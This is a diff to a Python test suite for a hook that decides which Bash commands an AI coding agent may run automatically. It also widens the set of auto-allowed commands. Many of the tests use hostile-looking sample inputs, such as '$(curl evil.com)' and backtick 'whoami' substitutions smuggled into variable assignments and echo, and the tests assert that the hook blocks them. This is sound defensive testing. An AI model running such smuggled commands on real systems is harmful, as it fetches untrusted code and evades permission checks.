@@ -313,7 +313,8 @@ class TestParseAllowRules:
 class TestMatchesAnyRule:
 
     RULES = {
-        "prefix": ["git log", "git status", "git add", "git commit", "git diff", "npm run", "node"],
+        "prefix": ["git log", "git status", "git add", "git commit", "git diff", "npm run", "node",
+                    "MERGE_BASE=", "GIT_AUTHOR_DATE="],
         "glob": ["git *"],
         "exact": ['git commit -m "fix"', "git log | head -5"],
     }
@@ -384,6 +385,28 @@ class TestMatchesAnyRule:
     def test_whitespace_only(self):
         assert sc.matches_any_rule("   ", self.RULES) is False
 
+    # --- Equals-ending prefix match ---
+
+    def test_var_assign_literal(self):
+        """MERGE_BASE=:* must match MERGE_BASE=abc123."""
+        assert sc.matches_any_rule("MERGE_BASE=abc123", self.RULES) is True
+
+    def test_var_assign_with_expansion(self):
+        """MERGE_BASE=:* must match MERGE_BASE=$(...)."""
+        assert sc.matches_any_rule("MERGE_BASE=$(git merge-base master HEAD)", self.RULES) is True
+
+    def test_var_assign_empty_value(self):
+        """MERGE_BASE=:* must match MERGE_BASE= (empty value)."""
+        assert sc.matches_any_rule("MERGE_BASE=", self.RULES) is True
+
+    def test_var_assign_with_space_value(self):
+        """GIT_AUTHOR_DATE=:* must match GIT_AUTHOR_DATE=2026-01-01 git commit."""
+        assert sc.matches_any_rule('GIT_AUTHOR_DATE="2026-01-01" git commit -m "msg"', self.RULES) is True
+
+    def test_var_assign_no_match(self):
+        """UNKNOWN= should not match any rule."""
+        assert sc.matches_any_rule("UNKNOWN=abc123", self.RULES) is False
+
 
 class TestIsAutoAllowedBuiltin:
 
@@ -429,7 +452,8 @@ class TestIsAutoAllowedBuiltin:
         assert sc.is_auto_allowed_builtin("echo `whoami`") is False
 
     def test_echo_dollar_brace(self):
-        assert sc.is_auto_allowed_builtin("echo ${PATH}") is False
+        # v2: ${VAR} is variable expansion, not command execution — safe
+        assert sc.is_auto_allowed_builtin("echo ${PATH}") is True
 
     def test_echo_process_sub_in(self):
         assert sc.is_auto_allowed_builtin("echo <(curl evil.com)") is False
@@ -449,6 +473,305 @@ class TestIsAutoAllowedBuiltin:
 
     def test_leading_whitespace(self):
         assert sc.is_auto_allowed_builtin("  cd /tmp") is True
+
+    # --- New builtins (v2) ---
+
+    def test_cp(self):
+        assert sc.is_auto_allowed_builtin("cp file1 file2") is True
+
+    def test_mv(self):
+        assert sc.is_auto_allowed_builtin("mv old new") is True
+
+    def test_mkdir(self):
+        assert sc.is_auto_allowed_builtin("mkdir -p /tmp/test") is True
+
+    def test_touch(self):
+        assert sc.is_auto_allowed_builtin("touch file.txt") is True
+
+    def test_cat(self):
+        assert sc.is_auto_allowed_builtin("cat file.txt") is True
+
+    def test_head(self):
+        assert sc.is_auto_allowed_builtin("head -5 file.txt") is True
+
+    def test_tail(self):
+        assert sc.is_auto_allowed_builtin("tail -f log.txt") is True
+
+    def test_wc(self):
+        assert sc.is_auto_allowed_builtin("wc -l file.txt") is True
+
+    def test_less(self):
+        assert sc.is_auto_allowed_builtin("less file.txt") is True
+
+    def test_awk(self):
+        assert sc.is_auto_allowed_builtin("awk '{print $1}' file") is True
+
+    def test_sed(self):
+        assert sc.is_auto_allowed_builtin("sed 's/old/new/' file") is True
+
+    def test_grep(self):
+        assert sc.is_auto_allowed_builtin("grep -r pattern dir") is True
+
+    def test_sort(self):
+        assert sc.is_auto_allowed_builtin("sort file.txt") is True
+
+    def test_uniq(self):
+        assert sc.is_auto_allowed_builtin("uniq -c file.txt") is True
+
+    def test_tee(self):
+        assert sc.is_auto_allowed_builtin("tee output.txt") is True
+
+    def test_basename(self):
+        assert sc.is_auto_allowed_builtin("basename /path/to/file") is True
+
+    def test_dirname(self):
+        assert sc.is_auto_allowed_builtin("dirname /path/to/file") is True
+
+    def test_realpath(self):
+        assert sc.is_auto_allowed_builtin("realpath ./relative") is True
+
+    def test_date(self):
+        assert sc.is_auto_allowed_builtin("date +%Y-%m-%d") is True
+
+    def test_sleep(self):
+        assert sc.is_auto_allowed_builtin("sleep 1") is True
+
+
+class TestFindMatchingClose:
+    """Tests for the paren/brace matching helper."""
+
+    def test_simple_parens(self):
+        assert sc._find_matching_close("(ab)", 0, "(", ")") == 3
+
+    def test_nested_parens(self):
+        assert sc._find_matching_close("(a(b)c)", 0, "(", ")") == 6
+
+    def test_parens_with_single_quotes(self):
+        assert sc._find_matching_close("(a')'b)", 0, "(", ")") == 6
+
+    def test_parens_with_double_quotes(self):
+        assert sc._find_matching_close('(a")"b)', 0, "(", ")") == 6
+
+    def test_parens_with_escaped_close(self):
+        assert sc._find_matching_close("(a\\)b)", 0, "(", ")") == 5
+
+    def test_unmatched(self):
+        assert sc._find_matching_close("(abc", 0, "(", ")") == -1
+
+    def test_braces(self):
+        assert sc._find_matching_close("{abc}", 0, "{", "}") == 4
+
+    def test_nested_braces(self):
+        assert sc._find_matching_close("{a{b}c}", 0, "{", "}") == 6
+
+    def test_empty_content(self):
+        assert sc._find_matching_close("()", 0, "(", ")") == 1
+
+
+class TestExtractExpansions:
+    """Tests for extracting $(cmd), `cmd`, ${var}, <(cmd), >(cmd)."""
+
+    def test_dollar_paren(self):
+        result = sc.extract_expansions("$(git status)")
+        assert result == [("cmd", "git status")]
+
+    def test_dollar_brace(self):
+        result = sc.extract_expansions("${PATH}")
+        assert result == [("var", "PATH")]
+
+    def test_backtick(self):
+        result = sc.extract_expansions("`whoami`")
+        assert result == [("cmd", "whoami")]
+
+    def test_process_sub_in(self):
+        result = sc.extract_expansions("<(cat file)")
+        assert result == [("cmd", "cat file")]
+
+    def test_process_sub_out(self):
+        result = sc.extract_expansions(">(tee file)")
+        assert result == [("cmd", "tee file")]
+
+    def test_nested_dollar_paren(self):
+        result = sc.extract_expansions("$(echo $(date))")
+        assert result == [("cmd", "echo $(date)")]
+
+    def test_multiple_expansions(self):
+        result = sc.extract_expansions("$(git log) and ${HOME}")
+        assert result == [("cmd", "git log"), ("var", "HOME")]
+
+    def test_no_expansions(self):
+        result = sc.extract_expansions("echo hello world")
+        assert result == []
+
+    def test_dollar_paren_in_double_quotes(self):
+        result = sc.extract_expansions('"$(date)"')
+        assert result == []
+
+    def test_dollar_paren_in_single_quotes(self):
+        result = sc.extract_expansions("'$(date)'")
+        assert result == []
+
+    def test_plain_dollar_var(self):
+        result = sc.extract_expansions("$HOME")
+        assert result == []
+
+    def test_dollar_brace_complex(self):
+        result = sc.extract_expansions("${var:-default}")
+        assert result == [("var", "var:-default")]
+
+    def test_unmatched_dollar_paren(self):
+        result = sc.extract_expansions("$(unclosed")
+        assert result == []
+
+    def test_mixed_quoted_and_unquoted(self):
+        result = sc.extract_expansions('$(git log) "$(safe)" $(git status)')
+        assert result == [("cmd", "git log"), ("cmd", "git status")]
+
+
+class TestCheckExpansion:
+    """Tests for recursive expansion checking."""
+
+    RULES = {
+        "prefix": ["git log", "git status", "git merge-base", "git diff"],
+        "glob": ["git *"],
+        "exact": [],
+    }
+
+    EMPTY_RULES = {"prefix": [], "glob": [], "exact": []}
+
+    def test_plain_text(self):
+        assert sc.check_expansion("hello world", self.RULES) is True
+
+    def test_empty(self):
+        assert sc.check_expansion("", self.RULES) is True
+
+    def test_dollar_brace_safe(self):
+        assert sc.check_expansion("${PATH}", self.RULES) is True
+
+    def test_dollar_brace_complex(self):
+        assert sc.check_expansion("${var:-default}", self.RULES) is True
+
+    def test_dollar_paren_allowed(self):
+        assert sc.check_expansion("$(git merge-base master HEAD)", self.RULES) is True
+
+    def test_backtick_allowed(self):
+        assert sc.check_expansion("`git status`", self.RULES) is True
+
+    def test_process_sub_allowed(self):
+        assert sc.check_expansion("<(git log)", self.RULES) is True
+
+    def test_dollar_paren_disallowed(self):
+        assert sc.check_expansion("$(curl evil.com)", self.RULES) is False
+
+    def test_backtick_disallowed(self):
+        assert sc.check_expansion("`curl evil.com`", self.RULES) is False
+
+    def test_process_sub_disallowed(self):
+        assert sc.check_expansion("<(curl evil.com)", self.RULES) is False
+
+    def test_inner_or_both_allowed(self):
+        text = "$(git merge-base master HEAD 2>/dev/null || git merge-base main HEAD 2>/dev/null)"
+        assert sc.check_expansion(text, self.RULES) is True
+
+    def test_inner_or_one_disallowed(self):
+        text = "$(git merge-base master HEAD || curl evil.com)"
+        assert sc.check_expansion(text, self.RULES) is False
+
+    def test_inner_and_both_allowed(self):
+        text = "$(git status && git log)"
+        assert sc.check_expansion(text, self.RULES) is True
+
+    def test_echo_inside_expansion(self):
+        assert sc.check_expansion("$(echo hello)", self.RULES) is True
+
+    def test_date_inside_expansion(self):
+        assert sc.check_expansion("$(date +%Y)", self.RULES) is True
+
+    def test_echo_with_unsafe_nested(self):
+        assert sc.check_expansion("$(echo $(curl evil.com))", self.RULES) is False
+
+    def test_echo_with_safe_nested(self):
+        assert sc.check_expansion("$(echo $(date))", self.RULES) is True
+
+    def test_depth_limit(self):
+        deep = "$(echo $(echo $(echo $(echo x))))"
+        assert sc.check_expansion(deep, self.RULES) is False
+
+    def test_mixed_cmd_and_var(self):
+        text = "$(git status) ${HOME}"
+        assert sc.check_expansion(text, self.RULES) is True
+
+    def test_quoted_expansion_ignored(self):
+        text = '"$(curl evil.com)"'
+        assert sc.check_expansion(text, self.RULES) is True
+
+    def test_empty_inner_after_split(self):
+        text = "$(|| git status)"
+        assert sc.check_expansion(text, self.RULES) is False
+
+
+class TestIsVariableAssignment:
+    """Tests for variable assignment recognition with expansion checking."""
+
+    RULES = {
+        "prefix": ["MERGE_BASE=", "BRANCH=", "GIT_AUTHOR_DATE=", "git merge-base", "git log"],
+        "glob": ["git *"],
+        "exact": [],
+    }
+
+    EMPTY_RULES = {"prefix": [], "glob": [], "exact": []}
+
+    def test_simple_assignment(self):
+        assert sc.is_variable_assignment("MERGE_BASE=abc123", self.RULES) is True
+
+    def test_assignment_with_hash(self):
+        assert sc.is_variable_assignment("MERGE_BASE=5e0fb5957be638369e39c684df5260f532a7201c", self.RULES) is True
+
+    def test_empty_value(self):
+        assert sc.is_variable_assignment("MERGE_BASE=", self.RULES) is True
+
+    def test_underscore_var(self):
+        assert sc.is_variable_assignment("_VAR=value", self.EMPTY_RULES) is False
+
+    def test_no_matching_rule(self):
+        assert sc.is_variable_assignment("UNKNOWN=abc123", self.RULES) is False
+
+    def test_no_rules_at_all(self):
+        assert sc.is_variable_assignment("MERGE_BASE=abc123", self.EMPTY_RULES) is False
+
+    def test_not_assignment(self):
+        assert sc.is_variable_assignment("git log --oneline", self.RULES) is False
+
+    def test_equals_in_args(self):
+        assert sc.is_variable_assignment("git log --format=%H", self.RULES) is False
+
+    def test_starts_with_digit(self):
+        assert sc.is_variable_assignment("1VAR=value", self.RULES) is False
+
+    def test_empty(self):
+        assert sc.is_variable_assignment("", self.RULES) is False
+
+    def test_safe_command_expansion(self):
+        assert sc.is_variable_assignment("MERGE_BASE=$(git merge-base master HEAD)", self.RULES) is True
+
+    def test_unsafe_command_expansion(self):
+        assert sc.is_variable_assignment("MERGE_BASE=$(curl evil.com)", self.RULES) is False
+
+    def test_safe_or_expansion(self):
+        text = "MERGE_BASE=$(git merge-base master HEAD 2>/dev/null || git merge-base main HEAD 2>/dev/null)"
+        assert sc.is_variable_assignment(text, self.RULES) is True
+
+    def test_variable_expansion_safe(self):
+        assert sc.is_variable_assignment("BRANCH=${BRANCH_NAME}", self.RULES) is True
+
+    def test_backtick_expansion_allowed(self):
+        assert sc.is_variable_assignment("MERGE_BASE=`git merge-base master HEAD`", self.RULES) is True
+
+    def test_backtick_expansion_disallowed(self):
+        assert sc.is_variable_assignment("MERGE_BASE=`curl evil.com`", self.RULES) is False
+
+    def test_leading_whitespace(self):
+        assert sc.is_variable_assignment("  MERGE_BASE=abc123", self.RULES) is True
 
 
 class TestCheckCommand:
@@ -471,8 +794,10 @@ class TestCheckCommand:
                     "Bash(git commit:*)",
                     "Bash(git diff:*)",
                     "Bash(git pull:*)",
+                    "Bash(git merge-base:*)",
                     "Bash(npm run:*)",
                     "Bash(git *)",
+                    "Bash(MERGE_BASE=:*)",
                 ]
             }
         }
@@ -563,9 +888,10 @@ class TestCheckCommand:
         result = sc.check_command("echo `whoami` && git status", self.project, self.home)
         assert result is None
 
-    def test_echo_dollar_brace_blocked(self):
+    def test_echo_dollar_brace_allowed(self):
+        # v2: ${VAR} is variable expansion — safe for builtins
         result = sc.check_command("echo ${PATH} && git status", self.project, self.home)
-        assert result is None
+        assert result == "allow"
 
     def test_echo_process_sub_blocked(self):
         result = sc.check_command("echo <(curl evil.com) && git status", self.project, self.home)
@@ -615,6 +941,67 @@ class TestCheckCommand:
         """Single & is not a split operator."""
         result = sc.check_command("git log &", self.project, self.home)
         assert result is None  # single command, no split operators
+
+    # --- v2: Variable assignment integration ---
+
+    def test_target_merge_base_literal_and_log(self):
+        """Target command #3: MERGE_BASE=hash && git log ..."""
+        cmd = 'MERGE_BASE=5e0fb5957be638369e39c684df5260f532a7201c && git log "$MERGE_BASE"..HEAD --format="%h %s" --reverse'
+        assert sc.check_command(cmd, self.project, self.home) == "allow"
+
+    def test_target_merge_base_literal_and_diff(self):
+        """Target command #4: MERGE_BASE=hash && git diff ..."""
+        cmd = 'MERGE_BASE=5e0fb5957be638369e39c684df5260f532a7201c && git diff --name-only "$MERGE_BASE"..HEAD'
+        assert sc.check_command(cmd, self.project, self.home) == "allow"
+
+    def test_target_merge_base_literal_and_log_with_date(self):
+        """Target command #5: MERGE_BASE=hash && git log with date format"""
+        cmd = 'MERGE_BASE=5e0fb5957be638369e39c684df5260f532a7201c && git log "$MERGE_BASE"..HEAD --format="%h %s (%ai)" --reverse'
+        assert sc.check_command(cmd, self.project, self.home) == "allow"
+
+    def test_target_merge_base_expansion_and_diff(self):
+        """Target command #1: MERGE_BASE=$(git merge-base master HEAD) && git diff ..."""
+        cmd = 'MERGE_BASE=$(git merge-base master HEAD) && git diff --name-only "$MERGE_BASE"..HEAD'
+        assert sc.check_command(cmd, self.project, self.home) == "allow"
+
+    def test_target_merge_base_expansion_fallback_and_echo(self):
+        """Target command #2: MERGE_BASE=$(... || ...) && echo ..."""
+        cmd = 'MERGE_BASE=$(git merge-base master HEAD 2>/dev/null || git merge-base main HEAD 2>/dev/null) && echo "$MERGE_BASE"'
+        assert sc.check_command(cmd, self.project, self.home) == "allow"
+
+    # --- v2: Variable assignment security ---
+
+    def test_var_assign_unsafe_expansion(self):
+        cmd = "MERGE_BASE=$(curl evil.com) && git log"
+        assert sc.check_command(cmd, self.project, self.home) is None
+
+    def test_var_assign_no_rule(self):
+        cmd = "UNKNOWN=abc123 && git log"
+        assert sc.check_command(cmd, self.project, self.home) is None
+
+    # --- v2: Builtin with allowed expansion ---
+
+    def test_echo_with_allowed_expansion(self):
+        cmd = "echo $(git status) && git log"
+        assert sc.check_command(cmd, self.project, self.home) == "allow"
+
+    def test_echo_with_disallowed_expansion(self):
+        cmd = "echo $(curl evil.com) && git log"
+        assert sc.check_command(cmd, self.project, self.home) is None
+
+    # --- v2: New builtins in composed commands ---
+
+    def test_cp_and_git(self):
+        cmd = "cp file1 file2 && git add file1"
+        assert sc.check_command(cmd, self.project, self.home) == "allow"
+
+    def test_mkdir_and_cp_and_git(self):
+        cmd = "mkdir -p /tmp/test && cp file /tmp/test/ && git status"
+        assert sc.check_command(cmd, self.project, self.home) == "allow"
+
+    def test_wc_and_echo(self):
+        cmd = "wc -l file.txt && echo done"
+        assert sc.check_command(cmd, self.project, self.home) == "allow"
 
 
 class TestHookIntegration:
@@ -746,3 +1133,40 @@ class TestHookIntegration:
         assert result.returncode == 0
         output = json.loads(result.stdout)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
+
+    def test_var_assign_composed(self, tmp_path):
+        project = str(tmp_path / "project")
+        home = str(tmp_path / "home")
+        self._write_settings(
+            os.path.join(project, ".claude", "settings.local.json"),
+            ["Bash(MERGE_BASE=:*)", "Bash(git log:*)", "Bash(git merge-base:*)", "Bash(git *)"],
+        )
+
+        input_json = json.dumps({
+            "tool_name": "Bash",
+            "tool_input": {"command": 'MERGE_BASE=$(git merge-base master HEAD) && git log "$MERGE_BASE"..HEAD --format="%h %s" --reverse'},
+            "cwd": project,
+        })
+
+        result = self._run_hook(input_json, home_dir=home)
+        assert result.returncode == 0
+        output = json.loads(result.stdout)
+        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
+
+    def test_var_assign_unsafe_blocked(self, tmp_path):
+        project = str(tmp_path / "project")
+        home = str(tmp_path / "home")
+        self._write_settings(
+            os.path.join(project, ".claude", "settings.local.json"),
+            ["Bash(MERGE_BASE=:*)", "Bash(git log:*)"],
+        )
+
+        input_json = json.dumps({
+            "tool_name": "Bash",
+            "tool_input": {"command": "MERGE_BASE=$(curl evil.com) && git log"},
+            "cwd": project,
+        })
+
+        result = self._run_hook(input_json, home_dir=home)
+        assert result.returncode == 0
+        assert result.stdout.strip() == ""  # passthrough, not approved
